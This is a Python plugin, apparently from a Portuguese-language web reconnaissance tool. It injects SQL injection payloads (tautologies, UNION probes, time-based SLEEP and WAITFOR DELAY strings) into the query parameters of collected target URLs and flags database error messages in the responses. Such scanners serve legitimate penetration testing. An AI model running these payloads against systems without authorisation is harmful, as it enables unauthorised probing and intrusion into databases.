import json
import logging
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, as_completed
import urllib.parse
from menu import C
from plugins.output import info, error, success, warn

logging.getLogger("httpx").setLevel(logging.WARNING)

SQLI_PAYLOADS = [
    "' OR '1'='1",
    "\" OR \"1\"=\"1\"",
    "1' ORDER BY 1--+",
    "1' UNION SELECT NULL--+",
    "' OR sleep(10)='",
    "1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)",
    "' WAITFOR DELAY '0:0:5'--",
]

SQLI_ERRORS = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark after the character string",
    "quoted string not properly terminated",
    "pdoexception",
    "postgresql query failed",
]

def scan_sqli(client, url: str) -> list[dict]:
    findings = []
    try:
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qsl(parsed.query)
        if not params:
            return findings

        # Test Error-based
        for key, value in params:
            for payload in SQLI_PAYLOADS:
                test_params = []
                for k, v in params:
                    if k == key:
                        test_params.append((k, v + payload))
                    else:
                        test_params.append((k, v))
                
                test_query = urllib.parse.urlencode(test_params)
                test_url = parsed._replace(query=test_query).geturl()
                
                try:
                    resp = client.get(test_url, timeout=10)
                    body = resp.text.lower()
                    for err in SQLI_ERRORS:
                        if err in body:
                            findings.append({
                                "url": test_url,
                                "type": "SQL_INJECTION",
                                "risk": "CRITICAL",
                                "details": f"Possível SQLi via {key} (Error-based: {err})",
                                "payload": payload,
                            })
                            break
                except Exception:
                    pass
    except Exception:
        pass
    return findings

def run(context: dict) -> list[str]:
    target = context.get("target")
    if not target:
        raise ValueError("Target required")
    print(f"\n{C.BOLD}{C.CYAN}▰▰▰ INJETANDO SQL (SQLi) ▰▰▰{C.END}\n")
    
    outdir = Path("output") / target / "sqli"
    outdir.mkdir(parents=True, exist_ok=True)
    results_file = outdir / "sqli_results.json"
    
    try:
        import httpx
    except ImportError:
        error("httpx não encontrado")
        return []
    
    all_findings = []
    urls_file = Path("output") / target / "urls" / "urls_params.txt"
    if not urls_file.exists():
        urls_file = Path("output") / target / "urls" / "urls_valid.txt"
        if not urls_file.exists():
            warn("Nenhuma URL com parâmetros encontrada para teste de SQLi.")
            return [str(results_file)]
    
    urls = list(set([u.strip() for u in urls_file.read_text().splitlines() if u.strip()]))
    info(f"   📊 Testando {len(urls)} URLs para SQL Injection...")

    limits = httpx.Limits(max_keepalive_connections=50, max_connections=100)
    with httpx.Client(verify=False, timeout=15, limits=limits) as client:
        with ThreadPoolExecutor(max_workers=30) as executor:
            futures = {executor.submit(scan_sqli, client, url): url for url in urls[:100]} # Test max 100
            for future in as_completed(futures):
                try:
                    result = future.result()
                    if result:
                        all_findings.extend(result)
                        for f in result:
                            info(f"   🚨 {C.RED}SQLi Encontrado: {f['url']}{C.END}")
                except Exception:
                    pass
    
    results_file.write_text(json.dumps(all_findings, indent=2, ensure_ascii=False))
    if all_findings:
        success(f"💉 {len(all_findings)} potenciais vulnerabilidades de SQLi encontradas!")
    else:
        success("✅ Nenhuma vulnerabilidade SQLi detectada.")
    
    return [str(results_file)]
